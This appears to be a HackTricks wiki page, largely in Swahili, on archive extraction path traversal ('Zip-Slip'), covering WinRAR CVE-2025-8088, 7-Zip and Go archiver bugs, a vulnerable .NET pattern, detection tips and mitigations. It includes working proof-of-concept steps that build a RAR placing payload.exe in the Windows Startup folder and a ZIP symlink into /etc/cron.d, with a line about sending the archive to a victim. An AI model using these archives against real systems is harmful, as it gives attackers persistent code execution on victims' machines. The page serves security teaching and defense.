# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Muhtasari

Miundo mingi ya archive (ZIP, RAR, TAR, 7-ZIP, n.k.) huruhusu kila entry kuwa na **internal path** yake. Extraction utility inapofuata path hiyo bila kuikagua, filename iliyoundwa ikiwa na `..` au **absolute path** (kwa mfano `C:\Windows\System32\`) itaandikwa nje ya directory iliyochaguliwa na mtumiaji.
Aina hii ya vulnerability inajulikana sana kama *Zip-Slip* au **archive extraction path traversal**.<sup>[[6]](#references)</sup>

Madhara yanaweza kuanzia ku-overwrite mafaili yoyote hadi kupata moja kwa moja **remote code execution (RCE)** kwa kuweka payload katika eneo la **auto-run**, kama vile Windows *Startup* folder.

## Chanzo Kikuu

1. Attacker huunda archive ambayo file headers moja au zaidi zina:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Au **symlinks** zilizoundwa mahsusi ambazo hutatuliwa nje ya target dir (jambo la kawaida katika ZIP/TAR kwenye *nix*).
2. Victim hu-extract archive kwa kutumia tool iliyo vulnerable ambayo huamini path iliyowekwa ndani (au hufuata symlinks), badala ya kuisafisha au kulazimisha extraction ifanyike chini ya directory iliyochaguliwa.
3. File huandikwa katika location inayodhibitiwa na attacker na hu-execute/loaded wakati mwingine system au user anapo-trigger path hiyo.

### .NET `Path.Combine` + `ZipArchive` traversal

Anti-pattern ya kawaida katika .NET ni kuunganisha destination iliyokusudiwa na `ZipArchiveEntry.FullName` inayodhibitiwa na user, kisha kufanya extraction bila path normalisation:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Ikiwa `entry.FullName` inaanza na `..\\`, inafanya traversal; ikiwa ni **absolute path**, sehemu ya upande wa kushoto hutupiliwa mbali kabisa, na hivyo kusababisha **arbitrary file write** kama utambulisho wa extraction.
- Archive ya proof-of-concept ya kuandika kwenye directory ya `app` iliyo jirani, inayofuatiliwa na scanner iliyoratibiwa:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Kuweka ZIP hiyo kwenye inbox inayofuatiliwa husababisha `C:\samples\app\0xdf.txt`, ikithibitisha traversal nje ya `C:\samples\queue\` na kuwezesha follow-on primitives (kwa mfano, DLL hijacks).

## Mfano wa Ulimwengu Halisi – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR ya Windows (ikiwemo CLI ya `rar` / `unrar`, DLL na source inayoweza kubebeka) ilishindwa kuthibitisha majina ya faili wakati wa extraction.
RAR archive hasidi iliyo na entry kama:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
ingeishia **nje** ya directory ya output iliyochaguliwa na ndani ya folder ya mtumiaji ya *Startup*. Baada ya logon, Windows huendesha kiotomatiki kila kitu kilichopo humo, hivyo kutoa *persistent* RCE.<sup>[[5]](#references)</sup>

### Kuunda PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Chaguo lililotumika:
* `-ep`  – hifadhi file paths kama zilivyotolewa ( **usi**ondoe `./` ya mwanzo).

Mpelekee victim `evil.rar` na umwelekeze aitoe kwa kutumia WinRAR build iliyo vulnerable.

### Exploitation Iliyoonekana Porini

ESET iliripoti spear-phishing campaigns za RomCom (Storm-0978/UNC2596) zilizoweka RAR archives zilizo abuse CVE-2025-8088 ili ku-deploy backdoors zilizobinafsishwa na kuwezesha ransomware operations.<sup>[[5]](#references)</sup>

## Cases Mpya (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries ambazo ni **symbolic links** zilifuatwa wakati wa extraction, hivyo attackers waliweza kutoka kwenye destination directory na ku-overwrite arbitrary paths. User interaction ni *kufungua/kutoa* archive tu.<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Ilirekebishwa katika **25.00** (Julai 2025) na matoleo ya baadaye.
* **Impact path**: Ku-overwrite `Start Menu/Programs/Startup` au service-run locations → code hu-run wakati wa logon inayofuata au service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Kwenye build iliyopatched, `/etc/cron.d` haitaguswa; symlink hutolewa kama link ndani ya /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` hufuata `../` na symlinked ZIP entries, na kuandika nje ya `outputDir`.<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project sasa deprecated).
* **Fix**: Hamia kwenye `mholt/archives` ≥ 0.1.0 au implement canonical-path checks kabla ya write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Orodhesha archive entries na uweke alama kwa name yoyote iliyo na `../`, `..\\`, *absolute paths* (`/`, `C:`) au entries za aina ya *symlink* ambazo target yake iko nje ya extraction dir.
* **Canonicalisation** – Hakikisha `realpath(join(dest, name))` bado inaanza na `dest`. Kataa vinginevyo.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – Decompress kwenye disposable directory kwa kutumia safe extractor (k.m., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) na uhakikishe paths zinazotokea zinabaki ndani ya directory.
* **Endpoint monitoring** – Toa alert kwa executables mpya zilizoandikwa kwenye `Startup`/`Run`/`cron` locations muda mfupi baada ya archive kufunguliwa na WinRAR/7-Zip/n.k.

## Mitigation & Hardening

1. **Update extractor** – WinRAR 7.13+ na 7-Zip 25.00+ hutekeleza path/symlink sanitisation. Tools zote mbili bado hazina auto-update.
2. Toa archives kwa kutumia “**Do not extract paths**” / “**Ignore paths**” inapowezekana.
3. Kwenye Unix, punguza privileges & mount **chroot/namespace** kabla ya extraction; kwenye Windows, tumia **AppContainer** au sandbox.
4. Ukiandika custom code, normalise kwa `realpath()`/`PathCanonicalize()` **kabla** ya create/write, na kataa entry yoyote inayotoka nje ya destination.

## Additional Affected / Historical Cases

* 2018 – Ushauri mkubwa wa *Zip-Slip* kutoka Snyk uliowaathiri Java/Go/JS libraries nyingi.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011, traversal inayofanana wakati wa `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377), TAR extraction traversal katika slugs (patch katika v1.2).<sup>[[7]](#references)</sup>
* Custom extraction logic yoyote inayoshindwa kuita `PathCanonicalize` / `realpath` kabla ya write.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
